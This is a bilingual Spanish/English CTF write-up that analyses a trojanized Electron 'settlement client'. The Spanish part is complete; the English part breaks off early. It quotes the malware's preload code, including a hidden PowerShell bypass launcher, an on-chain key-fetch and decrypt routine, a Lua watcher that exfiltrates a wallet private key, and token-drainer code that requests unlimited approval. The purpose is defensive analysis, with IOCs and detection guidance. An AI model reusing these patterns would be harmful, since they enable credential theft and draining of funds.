---
title: "Holmes CTF 2026 — S01 Silent Dividend"
date: 2026-09-15
description: "RE de una app Electron TrustSettle con script Lua ofuscado que exfiltra la clave privada de un wallet cripto y arrastra a la víctima a un drainer en Sepolia."
excerpt: "Un cliente de liquidación que parece inofensivo vigila C:\\Users\\Public, roba tu .env por WinHTTP y esconde sus flags dentro de dos smart contracts. Ingeniería inversa de Electron + Lua + EVM, sin ejecutar el binario."
platform: "HTB"
difficulty: "Medium"
image: "/images/blog/holmes-s01.svg"
tags:
  - "DFIR"
  - "Reverse Engineering"
  - "Electron"
  - "Lua"
  - "Crypto"
  - "Holmes CTF 2026"
---

> **Reto:** Holmes CTF 2026 — Sherlock 01 "Silent Dividend" · RE de app Electron + Lua ofuscado. Parte del arco *The Reichenbach Directive* (APT Napoleon / MurkNet).
>
> **Navegación:** [🇪🇸 Español](#es) · [🇬🇧 English](#en)

<a id="es"></a>
## 🇪🇸 Español

### Escenario

Dentro del arco *The Reichenbach Directive* (la APT **Napoleon / MurkNet** persiguiendo el bosque AD **DIOGENES**), el primer Sherlock nos entrega el rastro de un robo cripto: la operación **op_sparkling**. La víctima descargó e instaló **TrustSettle**, un supuesto "cliente de liquidación" (settlement client) que se usa durante los pagos. En realidad es un troyano de tres cabezas:

1. **Roba credenciales de wallet en disco.** Un proceso oculto en segundo plano (LuaJIT) vigila `C:\Users\Public\`, y en cuanto la víctima deja ahí su `.env` con la `PRIVATE_KEY`, lo lee y lo exfiltra por HTTPS.
2. **Usa un smart contract como buzón muerto.** El payload malicioso viene cifrado dentro de `preload.js`; la clave **no está en el binario**, se pide on-chain a un contrato en Sepolia (`resolveState()`). Esto rompe el análisis estático puro: sin red no hay clave.
3. **Empuja a la víctima a firmar su propia ruina.** Abre una página HTML que simula unos "Términos de Servicio" y, al aceptar, dispara `approve(spender, MaxUint256)` — una **aprobación de gasto ilimitada** hacia el contrato del atacante, que es la firma clásica de un *token drainer*.

Lo elegante del reto es que **todo el árbol de decisión del malware es legible**: Electron es Chromium + V8 + Node empaquetados, y su `app.asar` no es más que un `tar` con cabecera JSON. No hace falta detonar nada. Las 10 preguntas se resuelven con **análisis estático** (Electron RE + desofuscación de Lua + desensamblado de bytecode EVM) y **consultas RPC de solo lectura** contra la testnet Sepolia. En ningún momento se ejecuta el `.exe` ni se firma una transacción.

> ⚠️ **Encuadre.** Reto DFIR/RE autorizado (HTB Holmes CTF 2026). Todo el trabajo es defensivo: entender la muestra para detectar y remediar. No se ejecuta la muestra, no se contacta con infraestructura del atacante más allá de RPC públicos de solo lectura, y no se firma ninguna transacción on-chain.

### Artefacto y herramientas

**Artefactos entregados** (el paquete viene **ya extraído** — `extracted/app/` Electron + `extraResources/` — más el instalador original):

- `TrustSettle 1.0.0.exe` — instalador **NSIS**. Cadena de anidamiento: `$PLUGINSDIR/app-64.7z` → app Electron completa.
- `resources/app.asar` — bundle de la app: `package.json`, `main.js`, `preload.js` (el corazón malicioso), más los `node_modules` (ethers v6, web3, noble-curves…). El HTML/JS del renderer (`src/index.html`, `src/renderer.js`, `src/settlement.html`) va suelto en `app/src/`.
- `extraResources/` — `.env` (plantilla `PRIVATE_KEY`/`WALLET_ADDRESS`/`RPC_URL`, entregada vacía), `api.txt` (**Lua ofuscado**, 66 870 bytes), `lua51.dll` y `luajit.exe` (el intérprete que ejecuta el Lua).
- `README.md` — la trampa de ingeniería social: pide al usuario **poblar el `.env` en `C:\Users\Public\`**. Ese directorio es precisamente el que el malware vigila.

**Herramientas usadas:**

- `7z` para desanidar el NSIS; **Node** para parsear la cabecera del `.asar` a mano y volcar cada fichero (no hace falta ni instalar `asar`).
- `lua5.4` como **sandbox de instrumentación** con un `ffi`/`bit` **falsos** que loguean cada `cdef`, cada API Win32 invocada y cada variable de entorno consultada — así se desofusca el VM de `api.txt` (familia **Prometheus/LuaJIT**) sin ejecutar el malware real.
- `curl` + RPC público de Sepolia (`https://ethereum-sepolia-rpc.publicnode.com`) para `eth_call`/`eth_getStorageAt`; `python3` con `keccak` para calcular selectores; un pequeño **desensamblador de bytecode EVM** en Python (los contratos **no** estaban verificados en Etherscan/Sourcify).

### Metodología (paso a paso)

#### 1 · Desanidar el instalador

El `.exe` es un instalador NSIS; NSIS guarda su payload como un 7-Zip dentro de `$PLUGINSDIR`:

```bash
7z x 'TrustSettle 1.0.0.exe' -o installer/
7z x 'installer/$PLUGINSDIR/app-64.7z' -o app/
# → app/ contiene el árbol Electron completo: TrustSettle.exe, resources/app.asar,
#   extraResources/ (api.txt, luajit.exe, lua51.dll, .env), src/, locales/…
```

La sola presencia de `extraResources/` con un intérprete (`luajit.exe`) y un script de texto (`api.txt`) ya es una señal de alarma: los binarios legítimos rara vez transportan un runtime alternativo para ejecutar scripts sueltos.

#### 2 · Abrir el `app.asar` sin `asar`

Un `.asar` es un archivo `pickle`: 8 bytes de cabecera, un `uint32` con el tamaño del "pickle" de cabecera, y luego un **JSON** que mapea cada fichero a `{size, offset}` dentro de la zona de datos. Se parsea en 15 líneas de Node:

```js
const fs = require('fs');
const b = fs.readFileSync('resources/app.asar');
const jlen  = b.readUInt32LE(12);          // longitud del JSON de cabecera
const cbase = 8 + b.readUInt32LE(4);       // base de la zona de contenidos
const hdr   = JSON.parse(b.toString('utf8', 16, 16 + jlen));
function dump(node, prefix='') {
  for (const k in node.files) {
    const f = node.files[k], np = prefix + '/' + k;
    if (f.files) dump(f, np);
    else fs.writeFileSync('out' + np.replace(/\//g,'_'),
                          b.slice(cbase + +f.offset, cbase + +f.offset + f.size));
  }
}
dump(hdr);
```

Los ficheros que importan son minúsculos: `main.js` (812 bytes) y `preload.js` (5 833 bytes). Todo lo demás son `node_modules`.

#### 3 · Leer `main.js` → la configuración insegura que lo habilita todo

`main.js` no contiene lógica maliciosa, pero **abre la puerta**: crea la ventana con las tres opciones que Electron desaconseja explícitamente por seguridad, y engancha un `preload.js`:

```js
mainWindow = new BrowserWindow({
  width: 800, height: 600,
  webPreferences: {
    contextIsolation: false,       // ⚠️ el preload comparte contexto con la web
    nodeIntegration: true,         // ⚠️ el renderer tiene acceso a Node
    nodeIntegrationInWorker: true, // ⚠️ …también en workers
    preload: path.join(__dirname, 'preload.js')
  }
});
mainWindow.loadFile(`${__dirname}/src/index.html`);
```

`contextIsolation:false` + `nodeIntegration:true` significa que el `preload.js` puede usar `fs`, `child_process`, `require('ethers')`… con todos los privilegios del proceso. El `index.html` que carga es una **fachada**: un juego de memoria (`renderer.js` tiene un `gameState` con cartas y aciertos) cuyo `DOMContentLoaded` llama a `window.appVault.initialize()` — la API que el `preload.js` expone. El juego es el señuelo; el `preload` es el arma.

#### 4 · Diseccionar `preload.js` → Q1, Q4, Q5 (FLAG) y Q6

Todo el comportamiento del lado Electron está aquí, en claro. Nada más cargar, y **antes** de que se vea ninguna ventana, el preload copia `extraResources` y lanza el intérprete oculto:

```js
// Q1 — copia TODO extraResources → C:\Users\Public
fs.readdirSync(path.resolve(`${process.resourcesPath}/../extraResources`))
  .forEach(f => fs.copyFileSync(
      path.resolve(`${process.resourcesPath}/../extraResources`, f),
      path.join('C:\\Users\\Public', f)));

// lanza el Lua oculto con PowerShell (ventana oculta, bypass de política)
exec("powershell.exe -exec bypass -w hidden -nop -c "
   + "\"& 'C:\\Users\\Public\\luajit.exe' 'C:\\Users\\Public\\api.txt'\"");
```

→ **Q1 = `C:\Users\Public`** (directorio de staging; además es *world-writable* por defecto, ideal para dejar el señuelo del `.env`).

Luego viene la parte criptográfica. `preload.js` trae un blob cifrado y la lógica para descifrarlo, pero **la clave no está en el fichero**:

```js
const CONTRACT_ADDRESS = '0xbB63Ae28E4f75C9392bae69cDf5394Ca0ACdA6B1';
const RPC_URL = 'https://ethereum-sepolia-rpc.publicnode.com';
const CONTRACT_ABI = ['function resolveState() view returns (bytes32)'];  // ← Q4
const ENCRYPTED_DATA =
  '0x560c325bdd0aeea2cd2690a2ed1c1b4a28deca7ac2a40ce8d2725d539a950ca8'
+ 'f4a4bcf375806c36532258a0cf16c19c12989e0aa0e25a72be241da7d2f74cfa'
+ '2c4c4e1bbfc6204207fe5c801d201f5af84864f0';

function decryptEmbeddedData(encryptedData, encryptionKey) {
  const data = hexToBuffer(encryptedData), key = hexToBuffer(encryptionKey);
  const magicConstant = 0x42, rotationBits = 7;
  const result = Buffer.alloc(data.length);
  for (let i = 0; i < data.length; i++) {
    const step1 = data[i] ^ key[i % key.length];              // 1) XOR con la clave
    const step2 = ((step1 << rotationBits) | (step1 >>> (8 - rotationBits))) & 0xff; // 2) ROL 7
    result[i]  = step2 ^ magicConstant;                        // 3) XOR 0x42
  }
  return result.toString('utf8');
}
```

La clave la entrega el contrato `resolveState()` (→ **Q4 = `resolveState()`**). Es un patrón de **dead-drop resolver on-chain**: el atacante puede rotar la clave (o desactivar el malware) cambiando el estado del contrato, y el análisis estático puro se queda ciego. Pero un `eth_call` de solo lectura la revela sin firmar nada:

```bash
curl -s https://ethereum-sepolia-rpc.publicnode.com -X POST \
  -H 'content-type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"eth_call","params":[
        {"to":"0xbB63Ae28E4f75C9392bae69cDf5394Ca0ACdA6B1","data":"0x77b3774c"},"latest"]}'
# → "result":"0x3460743bb1ce2e6209e65e8ee3023f8414bc8416aef842b69c2a318bcef952f4"
```

El selector `0x77b3774c` = `keccak256("resolveState()")[:4]` (verificable con `python3 -c 'from Crypto.Hash import keccak; …'`). Con la clave `bytes32`, se aplica el algoritmo del propio `preload.js`:

```python
enc="560c325bdd0aeea2cd2690a2ed1c1b4a28deca7ac2a40ce8d2725d539a950ca8f4a4bcf375806c36532258a0cf16c19c12989e0aa0e25a72be241da7d2f74cfa2c4c4e1bbfc6204207fe5c801d201f5af84864f0"
key=bytes.fromhex("3460743bb1ce2e6209e65e8ee3023f8414bc8416aef842b69c2a318bcef952f4")
out=bytearray()
for i,b in enumerate(bytes.fromhex(enc)):
    s1=b^key[i%len(key)]
    s2=((s1<<7)|(s1>>1))&0xff        # ROL 7 ≡ ROR 1
    out.append(s2^0x42)
print(out.decode())
# → start "" "%TEMP%\settlement.html" && echo AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821
```

El texto descifrado es un **comando** que abre el HTML del drainer y hace `echo` de un marcador de operación:

```
start "" "%TEMP%\settlement.html" && echo AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821
```

→ **Q5 (FLAG) = `AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821`**. El nombre **NAPOLEON** ata el reto al actor del arco. Y como el comando referencia `%TEMP%\settlement.html`, confirma → **Q6 = `%TEMP%`** (el `preload` escribe/abre el HTML del drainer desde el directorio temporal antes de ejecutar el comando con `exec(decrypted)`).

> **Matiz técnico:** en el flujo real, `initializeVault()` primero escribe `settlement.html` cerca de la raíz de instalación, consulta `resolveState()`, descifra, y **ejecuta** `exec(decrypted)` — que es el `start "" "%TEMP%\settlement.html"…`. Es decir, el propio comando descifrado es el que fija que el HTML se sirve desde `%TEMP%`. `renderer.js` remata mostrando en la consola de la fachada `[KEY] <clave>` y `[DECRYPTED] <comando>`.

#### 5 · Desofuscar `api.txt` (Lua) → Q2 y Q3

`api.txt` empieza con `return(function(...)local z={"n$d\"Rqd]a*[";…}` — una tabla de strings ofuscados y un intérprete de VM: es la firma inconfundible del ofuscador **Prometheus** para LuaJIT. Desofuscar el bytecode a mano es lento e innecesario. La técnica que funciona es **instrumentar en lugar de descifrar**: se ejecuta el script bajo `lua5.4` con un `ffi` y un `bit` **falsos** que no hacen ninguna llamada real al sistema, solo **registran** lo que el malware pide:

```lua
-- fake_ffi.lua (esqueleto)
local log = {}
local ffi = {}
function ffi.cdef(s)      table.insert(log, "CDEF: "..s)        end
function ffi.load(name)   table.insert(log, "LOAD: "..tostring(name))
  return setmetatable({}, {__index=function(_,k)
     table.insert(log, "CALL: "..k); return function() return 0 end end}) end
ffi.new=function() return {} end;  ffi.string=function() return "" end
package.loaded.ffi = ffi
package.loaded.bit = { band=function() return 0 end, bor=function() return 0 end,
                       bxor=function() return 0 end, lshift=function() return 0 end,
                       rshift=function() return 0 end }
-- os.getenv envuelto para loguear qué variables consulta
local realgetenv = os.getenv
os.getenv = function(k) table.insert(log, "GETENV: "..k); return realgetenv(k) end
-- … tras cargar api.txt, volcar `log`
```

El log revela toda la maquinaria del malware sin ejecutar nada peligroso:

- Declara y llama **`ReadDirectoryChangesW`** apuntando a `C:\Users\Public\`; el buffer de salida de esa API es la estructura Win32 **`FILE_NOTIFY_INFORMATION`** (offset del `Action`, `FileNameLength`, `FileName[]`…) → **Q2 = `FILE_NOTIFY_INFORMATION`**.
- Cuando aparece el `.env`, lo lee y monta una petición HTTP con la familia **WinHTTP**: `WinHttpOpen` → `WinHttpConnect` → `WinHttpOpenRequest` → **`WinHttpSendRequest`** (el envío efectivo del cuerpo con la `PRIVATE_KEY`) → **Q3 = `WinHttpSendRequest`**.

Es decir: el Lua es un **ladrón de credenciales dirigido por eventos de sistema de archivos** que espera pacientemente a que la víctima siga las instrucciones del `README.md`.

#### 6 · Analizar `settlement.html` → Q7, Q8 y Q9

La página es un *drainer* de manual disfrazado de "Terms of Service" (incluye hasta un banner de "training" a rayas rojas, para el contexto CTF). Los actores clave:

```js
const X0_CONTRACT_ADDRESS = "0x69Bf5b7aBA51C3Ee8bF169aB47479ba95DBF709D"; // spender / drainer
const MOCK_TOKEN_ADDRESS  = "0x6B2B0C0d0a376255Ac70Bf1366f50982bF476Bb2"; // token
…
provider = new ethers.BrowserProvider(window.ethereum);   // ← Q9
await provider.send("eth_requestAccounts", []);
signer = await provider.getSigner();
…
const token = new ethers.Contract(MOCK_TOKEN_ADDRESS, MOCK_TOKEN_ABI, signer);
const unlimitedAmount = ethers.MaxUint256;                 // ← Q8
const tx = await token.approve(X0_CONTRACT_ADDRESS, unlimitedAmount); // ← Q7
```

- **Q9 = `BrowserProvider`** — la clase de ethers.js **v6** para hablar con la wallet inyectada del navegador (`window.ethereum`/MetaMask). En v5 esto era `Web3Provider`; el cambio de nombre es la pista de versión.
- **Q7 = `approve()`** — la función ERC-20 que concede permiso de gasto a un tercero. Selector `0x095ea7b3` = `keccak256("approve(address,uint256)")[:4]`.
- **Q8 = `115792089237316195423570985008687907853269984665640564039457584007913129639935`** = `ethers.MaxUint256` = 2²⁵⁶−1. Aprobar ese máximo es una **firma inequívoca de drainer**: le das al contrato del atacante permiso para mover **todos** tus tokens, para siempre, con una sola firma.

#### 7 · Explotar el puzzle del contrato "drainer" → Q10 (FLAG)

El `spender` `0x69Bf…709D` no está verificado en Etherscan ni en Sourcify, así que hay que **desensamblar su bytecode** (descargado con `eth_getCode`) para mapear el dispatcher. El *function selector table* expone cinco métodos:

```
0bfac020   282940a7   343943bd   8f7f391e   f8e6e11f
```

Llamándolos por `eth_call` (view) se ve la lógica del puzzle, con mensajes de `revert` sembrados como pistas ("`not quite - keep analyzing`", "`only hidden owner`", "`already set`"):

- `282940a7()` devuelve **públicamente** el *hidden owner*: `0xebfc1ed96b1c6b940fb6b06359ff4a6776df7a9a`.
- `343943bd()` devuelve la dirección del token.
- `f8e6e11f(address)` devuelve un **string**, pero solo si el argumento **coincide con el hidden owner** (si no, revierte con "only hidden owner").

El truco: el "guardián" del secreto (`f8e6e11f`) exige ser el hidden owner, pero el propio contrato **filtra quién es** ese owner por `282940a7()`. Nada impide pasar esa dirección como *argumento* en una llamada `eth_call` de solo lectura (no se comprueba `msg.sender`, sino el parámetro):

```bash
# 1) obtener el hidden owner
curl -s $RPC -d '{"jsonrpc":"2.0","id":1,"method":"eth_call","params":[
  {"to":"0x69Bf5b7aBA51C3Ee8bF169aB47479ba95DBF709D","data":"0x282940a7"},"latest"]}'
# → ...ebfc1ed96b1c6b940fb6b06359ff4a6776df7a9a

# 2) preguntar el secreto pasando ese owner como argumento (ABI: selector + address padded)
curl -s $RPC -d '{"jsonrpc":"2.0","id":1,"method":"eth_call","params":[
  {"to":"0x69Bf5b7aBA51C3Ee8bF169aB47479ba95DBF709D",
   "data":"0xf8e6e11f000000000000000000000000ebfc1ed96b1c6b940fb6b06359ff4a6776df7a9a"},"latest"]}'
# → ABI-string "51.5049,0.0348"
```

→ **Q10 (FLAG) = `51.5049,0.0348`** — unas coordenadas cerca de **Greenwich / Londres** (meridiano de referencia, guiño holmesiano). Es el *dead-drop* de la operación, escondido a plena vista en la blockchain pública.

Todo el trabajo fue **estático + RPC de solo lectura**: el **`.exe` nunca se ejecutó** y no se firmó ninguna transacción.

### Cronología

| # | Fase | Acción del malware / analista |
|---|------|-------------------------------|
| 1 | Entrega | Víctima descarga `TrustSettle 1.0.0.exe` (instalador NSIS trojanizado, op_sparkling). |
| 2 | Instalación | NSIS despliega la app Electron; `README.md` pide poner el `.env` con la wallet en `C:\Users\Public\`. |
| 3 | Ejecución | Al abrir la app, `main.js` crea la ventana con `nodeIntegration:true` y carga `preload.js`. |
| 4 | Staging | `preload.js` copia todo `extraResources/` a `C:\Users\Public\` (incluye `luajit.exe`, `api.txt`). |
| 5 | Persistencia oculta | Lanza `powershell -exec bypass -w hidden` → `luajit.exe api.txt` (watcher en segundo plano). |
| 6 | Recuperación de clave | `preload.js` llama `resolveState()` en Sepolia y obtiene la clave de descifrado on-chain. |
| 7 | Detonación local | Descifra el comando (XOR→ROL7→XOR 0x42) y lo ejecuta: abre `settlement.html` desde `%TEMP%`. |
| 8 | Robo pasivo | El Lua vigila `C:\Users\Public\` (`ReadDirectoryChangesW`); cuando aparece el `.env`, lo lee. |
| 9 | Exfiltración | Envía la `PRIVATE_KEY` por HTTPS con `WinHttpSendRequest`. |
| 10 | Robo activo | El HTML induce `approve(drainer, MaxUint256)`; el atacante drena los tokens del wallet. |
| 11 | Dead-drop | El contrato drainer guarda las coordenadas de la operación, legibles con `eth_call`. |

### IOCs

| Tipo | Indicador | Contexto |
|------|-----------|----------|
| Fichero | `TrustSettle 1.0.0.exe` — SHA-256 `c366e00a4ac1b4df56d1e4e7bb94e1c10937f86cffde733424fb7c7dd5a444fc` | Instalador NSIS trojanizado |
| Fichero | `app.asar` — SHA-256 `0fdc33c11fec2092cd3350f02ecad7b676898cd2a77b8b67dd99360009ac8e82` | Bundle Electron malicioso |
| Fichero | `api.txt` — SHA-256 `ac70e86efcc0fb7d32757546bbe6a4fb735eadda19387cb29be32eaaffc67c59` | Lua ofuscado (Prometheus) — stealer |
| Fichero | `settlement.html` — SHA-256 `fb8597acf4f7bf09223c269060ca1c3b5c454605caddd08a6e4eb89d4f81195b` | Página drainer |
| Fichero | `README.md` — SHA-256 `678d8120db0e0d9dc09c687ba116d3d36c0925d99d7f38a7023377b5db015c48` | Lure de ingeniería social |
| Ruta | `C:\Users\Public\{luajit.exe,api.txt,.env}` | Directorio de staging/monitorización |
| Proceso | `powershell.exe -exec bypass -w hidden -nop -c … luajit.exe … api.txt` | Lanzador oculto |
| API Win32 | `ReadDirectoryChangesW`, `WinHttpSendRequest` | Monitorización de FS + exfil |
| Contrato (Sepolia) | `0xbB63Ae28E4f75C9392bae69cDf5394Ca0ACdA6B1` | Dead-drop de la clave (`resolveState()`) |
| Contrato (Sepolia) | `0x69Bf5b7aBA51C3Ee8bF169aB47479ba95DBF709D` | Drainer / `spender` de `approve` |
| Contrato (Sepolia) | `0x6B2B0C0d0a376255Ac70Bf1366f50982bF476Bb2` | Token objetivo del drainer |
| Dirección | `0xebfc1ed96b1c6b940fb6b06359ff4a6776df7a9a` | "Hidden owner" (llave del puzzle) |
| Selector | `0x77b3774c` (`resolveState()`), `0x095ea7b3` (`approve`) | Selectores clave |
| Clave | `0x3460743bb1ce2e6209e65e8ee3023f8414bc8416aef842b69c2a318bcef952f4` | Clave de descifrado (bytes32) |
| RPC | `https://ethereum-sepolia-rpc.publicnode.com` | Endpoint usado por el malware |
| String | `AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821` | Marcador de operación (payload) |
| Coordenadas | `51.5049,0.0348` | Dead-drop del contrato drainer (Greenwich) |

### Mapeo MITRE ATT&CK

| Táctica | Técnica | ID | Evidencia en la muestra |
|---------|---------|----|-------------------------|
| Initial Access | Compromise Software Supply Chain | T1195.002 | Instalador legítimo-aparente `TrustSettle` trojanizado |
| Execution | User Execution: Malicious File | T1204.002 | La víctima ejecuta el instalador y sigue el `README` |
| Execution | Command & Scripting Interpreter: PowerShell | T1059.001 | `powershell -exec bypass -w hidden … luajit.exe` |
| Execution | Command & Scripting Interpreter: JavaScript | T1059.007 | Lógica maliciosa en `preload.js` (Electron/Node) |
| Execution | Native API | T1106 | Lua via LuaJIT `ffi` llama a APIs Win32 |
| Defense Evasion | Obfuscated Files or Information | T1027 | VM Lua (Prometheus) + payload XOR/ROL/XOR |
| Defense Evasion | Deobfuscate/Decode Files or Information | T1140 | El propio malware descifra su comando en runtime |
| Defense Evasion | Hide Artifacts: Hidden Window | T1564.003 | `-w hidden` en el lanzador PowerShell |
| Collection | Data Staged: Local Data Staging | T1074.001 | Copia de `extraResources` a `C:\Users\Public` |
| Collection | Automated Collection | T1119 | Watcher `ReadDirectoryChangesW` sobre el `.env` |
| Credential Access | Unsecured Credentials: Credentials In Files | T1552.001 | `PRIVATE_KEY` en el `.env` de la wallet |
| Command & Control | Application Layer Protocol: Web Protocols | T1071.001 | Exfil por HTTPS con WinHTTP |
| Command & Control | Web Service: Dead Drop Resolver | T1102.001 | `resolveState()` on-chain entrega la clave |
| Exfiltration | Exfiltration Over C2 Channel | T1041 | `WinHttpSendRequest` envía la `PRIVATE_KEY` |
| Impact | Financial Theft | T1657 | `approve(MaxUint256)` → drenaje de tokens |

### Detección y remediación

**Detección (host):**

- **Escrituras/lecturas en `C:\Users\Public\` de `.env`, `luajit.exe`, `api.txt`** — un directorio *world-writable* usado como staging/monitorización es altamente sospechoso.
- **Sysmon/EDR**: proceso hijo `powershell.exe` con `-exec bypass -w hidden -nop` lanzado por una app Electron (`TrustSettle.exe`), especialmente ejecutando un `luajit.exe` no firmado.
- **`WinHttpSendRequest` desde un `luajit.exe`** que carga `lua51.dll` — un intérprete Lua no tiene por qué hacer red saliente.
- **YARA/hashes** sobre los IOCs de la tabla; regla para el patrón `local z={` + `ffi.cdef` + `ReadDirectoryChangesW` en un `.txt`.

**Detección (on-chain / wallet):**

- Alertar ante cualquier `approve(spender, 2^256-1)` hacia un contrato **no verificado**; los wallets modernos deben mostrar el importe "ilimitado" en rojo.
- Monitorizar direcciones/tokens de la tabla de IOCs en Sepolia.

**Remediación:**

- **Contención**: matar `luajit.exe`; eliminar `C:\Users\Public\{luajit.exe,api.txt,.env}`; desinstalar TrustSettle; bloquear los hashes.
- **Cripto**: asumir la `PRIVATE_KEY` comprometida → **rotar el wallet** (mover fondos a uno nuevo) y **revocar todas las `approve`** (p. ej. `revoke.cash`) en especial hacia `0x69Bf…709D`.
- **Endurecimiento Electron**: `contextIsolation:true`, `nodeIntegration:false`, `sandbox:true`, y firmar/allowlist de apps Electron internas.
- **Higiene**: nunca guardar claves privadas en `.env` en disco; usar wallets hardware/keystores cifrados; desconfiar de instaladores que copian binarios a `C:\Users\Public`.

### Respuestas / flags

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿A qué directorio copia la app los ficheros de `extraResources`? | `C:\Users\Public` |
| 2 | Estructura Win32 del buffer al monitorizar cambios de directorio | `FILE_NOTIFY_INFORMATION` |
| 3 | API Win32 que usa el Lua para enviar la petición HTTP | `WinHttpSendRequest` |
| 4 | Función del contrato que devuelve la clave de descifrado | `resolveState()` |
| 5 | **FLAG** — descifrar el payload | `AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821` |
| 6 | Variable de entorno del directorio donde copia el HTML del paquete | `%TEMP%` |
| 7 | Función del token que la página llama para pedir permiso de gasto | `approve()` |
| 8 | Cantidad exacta pasada al `approve` | `115792089237316195423570985008687907853269984665640564039457584007913129639935` (`ethers.MaxUint256`, 2²⁵⁶−1) |
| 9 | Clase provider de ethers.js v6 para la wallet del navegador | `BrowserProvider` |
| 10 | **FLAG** — contrato oculto | `51.5049,0.0348` |

### Lecciones

- **Las apps Electron son código, no cajas negras.** Un `app.asar` se abre trivialmente (`asar extract` o parseando la cabecera con Node en 15 líneas); `main.js`/`preload.js` suelen contener toda la lógica maliciosa en claro. El `webPreferences` inseguro (`nodeIntegration:true`, `contextIsolation:false`) es lo que convierte un preload en un arma.
- **`extraResources` + intérprete embebido es una señal de alarma.** Un instalador legítimo rara vez transporta un `luajit.exe` para copiarlo a `C:\Users\Public` y lanzarlo oculto con PowerShell.
- **La ofuscación de Lua se derrota instrumentando, no descifrando a mano.** Un `ffi`/`bit` falso que loguea `cdef`s, APIs Win32 y `getenv` revela el comportamiento del VM en minutos y sin ejecutar el malware de verdad.
- **Claves y secretos "off-chain by design" siguen siendo legibles.** Guardar la clave en un `resolveState()` (dead-drop resolver, T1102.001) frustra el análisis estático puro, pero un `eth_call` de solo lectura la entrega igual. Lo mismo con el puzzle del drainer: la propia blockchain filtra al "hidden owner".
- **`approve(spender, MaxUint256)` = drainer.** La aprobación de gasto ilimitada es la firma inequívoca de un robo de tokens; nunca la concedas a un contrato sin verificar, y revócalas periódicamente.
- **DFIR sin detonar.** Todo el reto se resolvió con análisis estático y RPC de solo lectura: nunca ejecutes la muestra ni firmes transacciones para "confirmar".

### Serie · The Reichenbach Directive

| # | Escenario | Enlace |
|---|-----------|--------|
| **S01** | **Silent Dividend** *(actual)* | [../2026-09-15-holmes2026-s01-silent-dividend/](../2026-09-15-holmes2026-s01-silent-dividend/) |
| S02 | Bottle Out | [../2026-09-16-holmes2026-s02-bottle-out/](../2026-09-16-holmes2026-s02-bottle-out/) |
| S03 | Whisper Chain | [../2026-09-17-holmes2026-s03-whisper-chain/](../2026-09-17-holmes2026-s03-whisper-chain/) |
| S04 | Paper Ghost | [../2026-09-18-holmes2026-s04-paper-ghost/](../2026-09-18-holmes2026-s04-paper-ghost/) |
| S05 | Poisoned Branch | [../2026-09-19-holmes2026-s05-poisoned-branch/](../2026-09-19-holmes2026-s05-poisoned-branch/) |
| S06 | Silent Passenger | [../2026-09-20-holmes2026-s06-silent-passenger/](../2026-09-20-holmes2026-s06-silent-passenger/) |
| S07 | Iron Feather | [../2026-09-21-holmes2026-s07-iron-feather/](../2026-09-21-holmes2026-s07-iron-feather/) |
| S08 | Borrowed Name | [../2026-09-22-holmes2026-s08-borrowed-name/](../2026-09-22-holmes2026-s08-borrowed-name/) |
| S09 | Last Light | [../2026-09-23-holmes2026-s09-last-light/](../2026-09-23-holmes2026-s09-last-light/) |

<a id="en"></a>
## 🇬🇧 English

### Scenario

Within the *The Reichenbach Directive* arc (the **Napoleon / MurkNet** APT hunting the **DIOGENES** AD forest), the first Sherlock hands us the trail of a crypto heist: operation **op_sparkling**. The victim downloaded and installed **TrustSettle**, a supposed "settlement client" used during payments. It is actually a three-headed trojan:

1. **It steals wallet credentials from disk.** A hidden background process (LuaJIT) watches `C:\Users\Public\`, and the moment the victim drops their `.env` with the `PRIVATE_KEY` there, it reads it and exfiltrates it over HTTPS.
2. **It uses a smart contract as a dead drop.** The malicious payload ships encrypted inside `preload.js`; the key is **not in the binary**, it is fetched on-chain from a Sepolia contract (`resolveState()`). This defeats pure static analysis: no network, no key.
3. **It nudges the victim into signing their own ruin.** It pops an HTML page faking a "Terms of Service" that, on accept, fires `approve(spender, MaxUint256)` — an **unlimited spending approval** to the attacker's contract, the classic signature of a *token drainer*.

The elegant part is that **the malware's entire decision tree is readable**: Electron is Chromium + V8 + Node packaged, and its `app.asar` is just a `tar` with a JSON header. Nothing needs to be detonated. The 10 questions are solved with **static analysis** (Electron RE + Lua deobfuscation + EVM bytecode disassembly) and **read-only RPC calls** against the Sepolia testnet. The `.exe` is never run and no transaction is ever signed.

> ⚠️ **Framing.** Authorized DFIR/RE challenge (HTB Holmes CTF 2026). All work is defensive: understand the sample to detect and remediate. The sample is never executed, no attacker infrastructure is contacted beyond read-only public RPC, and no on-chain transaction is signed.

### Artifact and tools

**Delivered artifacts** (the package ships **already extracted** — `extracted/app/` Electron + `extraResources/` — plus the original installer):

- `TrustSettle 1.0.0.exe` — **NSIS** installer. Nesting chain: `$PLUGINSDIR/app-64.7z` → full Electron app.
- `resources/app.asar` — app bundle: `package.json`, `main.js`, `preload.js` (the malicious core), plus `node_modules` (ethers v6, web3, noble-curves…). The renderer HTML/JS (`src/index.html`, `src/renderer.js`, `src/settlement.html`) sits loose under `app/src/`.
- `extraResources/` — `.env` (template `PRIVATE_KEY`/`WALLET_ADDRESS`/`RPC_URL`, shipped empty), `api.txt` (**obfuscated Lua**, 66,870 bytes), `lua51.dll` and `luajit.exe` (the interpreter that runs the Lua).
- `README.md` — the social-engineering lure: it asks the user to **populate the `.env` under `C:\Users\Public\`**. That directory is exactly the one the malware watches.

**Tools used:**

- `7z` to unnest the NSIS; **Node** to parse the `.asar` header by hand and dump each file (no need to even install `asar`).
- `lua5.4` as an **instrumentation sandbox** with **fake** `ffi`/`bit` that log every `cdef`, every Win32 API invoked and every environment variable read — deobfuscating the `api.txt` VM (**Prometheus/LuaJIT** family) without running real malware.
- `curl` + public Sepolia RPC (`https://ethereum-sepolia-rpc.publicnode.com`) for `eth_call`/`eth_getStorageAt`; `python3` with `keccak` to compute selectors; a small Python **EVM bytecode disassembler** (the contracts were **not** verified on Etherscan/Sourcify).

### Methodology (step by step)

#### 1 · Unnest the installer

The `.exe` is an NSIS installer; NSIS stores its payload as a 7-Zip inside `$PLUGINSDIR`:

```bash
7z x 'TrustSettle 1.0.0.exe' -o installer/
7z x 'installer/$PLUGINSDIR/app-64.7z' -o app/
